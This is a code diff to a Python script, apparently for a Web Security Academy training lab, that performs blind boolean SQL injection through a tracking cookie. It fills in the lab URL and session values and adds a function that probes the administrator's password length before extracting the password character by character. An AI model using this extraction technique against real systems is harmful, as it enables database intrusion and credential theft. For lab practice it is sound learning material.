@@ -17,9 +17,9 @@ import urllib.error
 import urllib.request
 
 # ── 改成你自己的 ────────────────────────────────────────────
-BASE = "https://0a0000000000000000000000.web-security-academy.net"
-TRACK_ID = "PASTE_TRACKING_ID_HERE"
-SESSION = "PASTE_SESSION_HERE"
+BASE = "https://0aa600fc045437d4807e765200e6000c.web-security-academy.net/"
+TRACK_ID = "MqUwGUvfeia0Tl0q"
+SESSION = "hgwqpMjxRBXFjSLSKGVg28UZADqa1DD0"
 MARKER = "Welcome back"          # 「真」信号：页面上出现这句话
 # ───────────────────────────────────────────────────────────
 
@@ -60,6 +60,15 @@ def extract_char(pos: int) -> str:
     return chr(lo)
 
 
+def detect_len() -> int:
+    n = 1
+    while True:
+        cond = f"(SELECT LENGTH(password) FROM users WHERE username='administrator') > {n}"
+        if not is_true(cond):
+            return n
+        n += 1
+
+
 def main() -> int:
     if "PASTE_TRACKING_ID_HERE" in TRACK_ID:
         print("先把 BASE / TRACK_ID / SESSION 三个常量填上")
@@ -67,7 +76,7 @@ def main() -> int:
     if not is_true("'1'='1'"):
         print("自检失败：连 '1'='1' 都没出现 MARKER —— 检查 cookie 是否抄错、lab 是否过期")
         return 1
-
+    PWD_LEN=detect_len()
     pwd = ""
     for i in range(1, PWD_LEN + 1):
         ch = extract_char(i)
